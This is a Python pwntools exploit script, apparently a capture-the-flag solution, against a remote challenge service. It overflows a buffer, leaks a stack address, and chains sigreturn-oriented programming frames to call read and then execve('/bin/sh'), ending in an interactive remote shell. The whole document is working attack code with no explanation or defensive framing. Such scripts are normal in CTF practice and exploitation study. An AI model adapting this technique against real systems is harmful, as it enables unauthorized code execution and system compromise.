#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

def delay(s='A'):
	print s
	sleep(0.2)
	'''
	if s == 'A':
		sleep(0.1)
	else:
		raw_input(s)
		#sleep(0.1)
	'''

r = remote('pwnhub.tw', 55688)
#r = remote('127.0.0.1', 7122)

#syscall = 0x400101
syscall = 0x4000f0
_start = 0x4000b0
_end = 0x4000f2

r.send(cyclic(0x128)+flat(_start, _end, _start))
delay()
r.send(cyclic(0x120)+'AAAABBBB'+flat(syscall)+'\xf2\x00')
delay('B')
r.sendline('')

r.recvuntil('AAAABBBB')
x = r.recvrepeat(0.2)
for i in range(6):
	print hex(u64(x[8*i : 8*(i+1)]))

stack = u64(x[32:40])
stack &= 0xfffffffffffff000
print 'stack:', hex(stack)

delay('B')
r.send(cyclic(0x128)+flat(_start, _end, _start))

off = 0x000
frame = SigreturnFrame(kernel='amd64')
frame.rax = 0
frame.rdi = 0
frame.rsi = stack
frame.rdx = 0x200
frame.rip = 0x400101
frame.rsp = stack+8-off
#frame.rsp = stack
#r.send(('A'*56+str(frame)).ljust(0x128)+flat(syscall))
delay('B')
r.send(('A'*16+str(frame)).ljust(0x128)+flat(syscall)+'\xf2\x00')
delay('C')
r.sendline('A'*14)
delay('B')
r.send('/bin/sh\x00'+'A'*0x128+p64(_start))
#r.send('/bin/sh\x00'+p64(_start)*0x360)
#r.send(p64(_start)*0x360)
#r.interactive()


delay('D')
r.send(cyclic(0x128)+flat(_start, _end, _start))
delay('D')
frame.rax = 59
frame.rdi = stack-off
frame.rsi = 0
frame.rdx = 0
r.send(('A'*16+str(frame)).ljust(0x128)+flat(syscall)+'\xf2\x00')
delay('E')
r.sendline('A'*14)
#delay('E')
#r.send('/bin/sh\x00'+p64(_start))

r.interactive()

